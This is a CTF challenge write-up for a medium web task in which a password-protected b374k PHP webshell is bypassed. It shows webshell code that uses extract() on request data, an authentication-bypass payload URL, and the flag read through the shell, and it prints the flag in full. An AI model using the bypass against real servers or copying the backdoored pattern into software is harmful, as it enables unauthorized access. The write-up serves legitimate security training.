# b374k.php webshell / c99 style PHP backdoor

## Version

Date        | Author                  | Contact               | Version | Comment
---         | ---                     | ---                   | ---     | ---
24/11/2019  | noraj (Alexandre ZANNI) | noraj#0833 on discord | 1.0     | Document creation

Information displayed for CTF players:

+ **Name of the challenge** / **Nom du challenge**: `Une porte peut en cacher une autre`
+ **Category** / **Catégorie**: `Web`
+ **Internet**: not needed
+ **Difficulty** / **Difficulté**: Medium / Moyen

### Description

```
A very famous backdoor was placed on the website, but hopefully it is password protected.

Flag format: sigsegv{flag}

author: [noraj](https://pwn.by/noraj/)
```

### Hints

- Hint1: b374k.php
- Hint2: vim

## Integration

This challenge require a Docker Engine and Docker Compose.

Builds, (re)creates, starts, and attaches to containers for a service:

```
$ docker-compose up --build
```

Add `-d` if you want to detach the container.

## Solving

### Author solution

The webshell is `b374k.php`.
The comment on the home page says the hacker used vim.
Let's look for a `.swp` vim backup file: `b374k.php.swp`.

Let's look at the code:

```php
$GLOBALS['pass'] = "09c7018841af655c9b025c0a3e5b167d05f42cd1"; // sha1(md5(pass))
...
$GLOBALS['login'] = 1;

@extract($_REQUEST["noraj"], EXTR_OVERWRITE);
...
if(!function_exists('auth')){
	function auth(){
		if(isset($GLOBALS['pass']) && (trim($GLOBALS['pass'])!='')){
			$c = $_COOKIE;
			$p = $_POST;
			if($GLOBALS['login'] == 0 || isset($p['pass'])){
				$your_pass = sha1(md5($p['pass']));
				if($GLOBALS['login'] == 0 || $your_pass==$GLOBALS['pass']){
					setcookie("pass", $GLOBALS['pass'], time()+36000, "/");
					header("Location: b374k.php");
				}
			}
```

It's no use to try to guess the password, it is `sha1(md5(pass))` of a strong one.

But we can see there is `$GLOBALS['login'] = 1;`, like *login enabled* and then
there are `$GLOBALS['login'] == 0 || isset($p['pass'])` and
`$GLOBALS['login'] == 0 || $your_pass==$GLOBALS['pass']`. So if
`$GLOBALS['login'] == 0` the login feature will be disable and we will gain
access to the shell without using a password.

`extract` allows to _Import variables into the current symbol table from_ and to
overwrite it. So let's use it to overwrite `$GLOBALS['login']` and bypass the
authentication.

The payload is `http://x.x.x.x/b374k.php?noraj[login]=0` or just
`http://x.x.x.x/b374k.php?noraj[login]`.

So we have a webshell but most of useful binaries for listing directories or
reading a file were removed.

We have two options, do it in pure PHP or find a non-removed binary.

For example reading the flag with `diff`:

```
/usr/src/app/>diff /home/noraj/flag.txt /etc/hostname
--- /home/noraj/flag.txt
+++ /etc/hostname
@@ -1 +1 @@
-sigsegv{∙∙∙∙∙·▫▫ᵒᴼᵒ▫ₒₒ▫ᵒᴼᵒ▫ₒₒ▫ᵒᴼᵒnorajᵒᴼᵒ▫ₒₒ▫ᵒᴼᵒ▫ₒₒ▫ᵒᴼᵒ▫▫·∙∙∙∙∙}
\ No newline at end of file
+da3acf79d34a
```

More about backdored backdoors: https://rawsec.ml/en/c99-php-backdoor-backdoored/

## Flag

`sigsegv{∙∙∙∙∙·▫▫ᵒᴼᵒ▫ₒₒ▫ᵒᴼᵒ▫ₒₒ▫ᵒᴼᵒnorajᵒᴼᵒ▫ₒₒ▫ᵒᴼᵒ▫ₒₒ▫ᵒᴼᵒ▫▫·∙∙∙∙∙}`

